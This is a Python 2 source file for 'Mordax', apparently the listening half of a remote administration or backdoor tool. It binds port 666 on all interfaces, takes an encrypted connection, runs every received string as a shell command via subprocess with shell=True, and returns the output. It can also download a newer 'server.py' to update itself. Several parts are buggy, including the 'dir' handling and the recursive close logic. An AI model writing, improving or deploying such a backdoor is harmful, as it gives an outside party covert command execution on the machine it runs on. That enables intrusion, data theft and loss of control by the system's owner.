import socket
import subprocess
import os
import sys
import Crypt
import CheckVersion
import threading

host = ""
port = 666


class Mordax(Crypt.Crypt, CheckVersion.checkVersion):

    def __init__(self):

        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind((host, port))
        self.s.listen(3)
        self.setVersion(1.0)
        self.checkVersion()
        self.connection, self.connected_adress = 0, 0
        self.initialization_vector = "Init_Vektor"
        if self.checkVersion():
            self.downloadVersion("server.py")

    def start(self):

        self.connection, self.connected_adress = self.s.accept()
        self.initialization_vector = self.depad(self.connection.recv(256))
        self.key_and_iv("mordax", self.initialization_vector)

        if self.connection and self.connected_adress:
            connect = threading.Thread(target=self.server)
            connect.start()
            self.start()

    def server(self):

        while True:
            try:
                data = self.decode(self.connection.recv(2048))
                data = self.depad(data)
                if data[:2] == "cd":
                    path = data[3:]
                    try:
                        os.chdir(data[3:])
                    except socket.error, Crypt.crypto.exceptions:
                        pass

                if data[3:] == "dir":
                    os.listdir(path)

                if len(data) > 0:
                    if data == "close":
                        print("close")
                        self.s.close()
                        self.connection.close()
                        self.server()

                    cmd = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    stdout = cmd.stdout.read() + cmd.stderr.read() + ";" + os.getcwd()
                    size = sys.getsizeof(stdout)

                    if size > 2048:
                        size = sys.getsizeof(stdout)
                        size = str(size)
                        self.connection.send(self.encode("SIZE" + "; " + size))
                        self.connection.send(self.encode(stdout))
                    else:
                        self.connection.send(self.encode(stdout))

            except socket.error as error:
                self.connection.close()
                self.start()
                self.connection, addr = self.s.accept()
                print(addr, error)


Server = Mordax()
Server.start()
